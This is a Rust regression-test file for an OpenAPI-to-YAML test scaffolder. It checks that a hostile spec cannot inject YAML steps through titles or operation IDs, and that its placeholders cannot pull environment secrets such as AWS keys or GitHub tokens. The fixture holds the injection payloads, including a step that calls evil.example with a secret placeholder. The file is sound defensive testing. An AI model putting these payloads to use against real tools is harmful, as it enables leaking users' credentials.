//! A spec is someone else's text: its titles can't write YAML into the
//! scaffolded suite, and its `${...}` can't read the environment, not when
//! the suite runs and not under `--confirm`.

use std::io::{BufRead, BufReader, Write};
use std::net::TcpListener;
use std::sync::{Arc, Mutex};

use atalanta_api::openapi::{confirm, render, scaffold, Options, Spec};
use serde_json::Value;

const HOSTILE: &str = r##"{
  "openapi": "3.0.3",
  "info": {"title": "Pets\ntests:\n  - name: pwn\n#", "version": "1"},
  "servers": [{"url": "https://pets.example/${SECRET_BASE}"}],
  "paths": {
    "/pets/${SECRET_PATH}": {"get": {
      "operationId": "get\n      - http: { url: 'https://evil.example/${SECRET_STEP}' }\n#",
      "parameters": [{"name": "q", "in": "query", "required": true,
                      "schema": {"type": "string", "default": "${SECRET_QUERY}"}}],
      "responses": {"200": {"description": "ok", "content": {"application/json": {
        "schema": {"type": "object", "required": ["kind"],
                   "properties": {"kind": {"type": "string", "enum": ["${SECRET_ENUM}"]}}}}}}}
    }}
  }
}"##;

#[test]
fn a_hostile_spec_writes_no_yaml_and_reads_no_environment() {
    let spec = Spec::parse(HOSTILE).unwrap();
    let s = scaffold(&spec, &Options::default()).unwrap();
    let yaml = render(&s).unwrap();
    // One test with one step: nothing the spec wrote became structure.
    let doc: Value = serde_yaml::from_str(&yaml).unwrap_or_else(|e| panic!("{e}\n{yaml}"));
    assert_eq!(doc["tests"].as_array().unwrap().len(), 1, "{yaml}");
    assert_eq!(
        doc["tests"][0]["steps"].as_array().unwrap().len(),
        1,
        "{yaml}"
    );
    for line in yaml.lines().filter(|l| l.contains("evil.example")) {
        assert!(line.trim_start().starts_with('#'), "{line}\n{yaml}");
    }
    // Its placeholders are written escaped: the loader reads back the text
    // (a `#` comment is never read, so only the other lines count).
    let code: String = yaml
        .lines()
        .filter(|l| !l.trim_start().starts_with('#'))
        .collect::<Vec<_>>()
        .join("\n");
    for name in ["SECRET_BASE", "SECRET_PATH", "SECRET_QUERY", "SECRET_ENUM"] {
        let escaped = format!("$${{{name}}}");
        assert!(code.contains(&escaped), "{name}\n{yaml}");
        let live = format!("${{{name}}}");
        assert!(
            !code.replace(&escaped, "").contains(&live),
            "{name}\n{yaml}"
        );
    }
}

#[tokio::test]
async fn confirm_does_not_fill_a_hostile_specs_variables_from_the_environment() {
    let seen = Arc::new(Mutex::new(Vec::<String>::new()));
    let listener = TcpListener::bind("127.0.0.1:0").unwrap();
    let addr = listener.local_addr().unwrap();
    let log = seen.clone();
    std::thread::spawn(move || {
        for mut conn in listener.incoming().flatten() {
            let mut reader = BufReader::new(conn.try_clone().unwrap());
            let mut line = String::new();
            let _ = reader.read_line(&mut line);
            log.lock().unwrap().push(line);
            let _ = conn.write_all(
                b"HTTP/1.1 200 X\r\ncontent-type: application/json\r\ncontent-length: 2\r\nconnection: close\r\n\r\n{}",
            );
        }
    });
    let spec = Spec::parse(HOSTILE).unwrap();
    let mut s = scaffold(
        &spec,
        &Options {
            base_url: Some(format!("http://{addr}")),
            ..Default::default()
        },
    )
    .unwrap();
    let env = |_: &str| Some("HUNTED-VALUE".to_string());
    let report = confirm(&mut s, &env).await.unwrap();
    assert_eq!(report.sent, 1, "{report:?}");
    let lines = seen.lock().unwrap().clone();
    assert!(!lines.is_empty());
    assert!(
        lines.iter().all(|l| !l.contains("HUNTED-VALUE")),
        "{lines:?}"
    );
    assert!(lines[0].contains("%7BSECRET_PATH%7D"), "{lines:?}");
}

/// Audit of the November fixes: a spec names a parameter after a secret the
/// user holds. The placeholder Atalanta writes for it is its own (`API_…`),
/// so `--confirm` never reads `AWS_SECRET_ACCESS_KEY` and never sends it.
#[tokio::test]
async fn a_parameter_named_like_an_env_secret_reads_only_an_api_variable() {
    let seen = Arc::new(Mutex::new(Vec::<String>::new()));
    let listener = TcpListener::bind("127.0.0.1:0").unwrap();
    let addr = listener.local_addr().unwrap();
    let log = seen.clone();
    std::thread::spawn(move || {
        for mut conn in listener.incoming().flatten() {
            let mut reader = BufReader::new(conn.try_clone().unwrap());
            let mut line = String::new();
            let _ = reader.read_line(&mut line);
            log.lock().unwrap().push(line);
            let _ = conn.write_all(
                b"HTTP/1.1 200 X\r\ncontent-type: application/json\r\ncontent-length: 2\r\nconnection: close\r\n\r\n{}",
            );
        }
    });
    let spec = Spec::parse(
        r#"{"openapi": "3.0.3", "info": {"title": "T", "version": "1"},
            "paths": {"/things/{aws_secret_access_key}": {"get": {
              "operationId": "getThing",
              "parameters": [
                {"name": "aws_secret_access_key", "in": "path", "required": true, "schema": {"type": "string"}},
                {"name": "github_token", "in": "query", "required": true, "schema": {"type": "string"}}],
              "responses": {"200": {"description": "ok"}}}}}}"#,
    )
    .unwrap();
    let mut s = scaffold(
        &spec,
        &Options {
            base_url: Some(format!("http://{addr}")),
            ..Default::default()
        },
    )
    .unwrap();
    let yaml = render(&s).unwrap();
    assert!(yaml.contains("${API_AWS_SECRET_ACCESS_KEY}"), "{yaml}");
    assert!(yaml.contains("${API_GITHUB_TOKEN}"), "{yaml}");
    assert!(!yaml.contains("${AWS_SECRET_ACCESS_KEY}"), "{yaml}");
    let env = |name: &str| match name {
        "AWS_SECRET_ACCESS_KEY" | "GITHUB_TOKEN" => Some("HUNTED-VALUE".to_string()),
        n if n.starts_with("API_") => Some("ok".to_string()),
        _ => None,
    };
    confirm(&mut s, &env).await.unwrap();
    let lines = seen.lock().unwrap().clone();
    assert!(!lines.is_empty(), "the confirm request was sent");
    assert!(
        lines.iter().all(|l| !l.contains("HUNTED-VALUE")),
        "{lines:?}"
    );
}
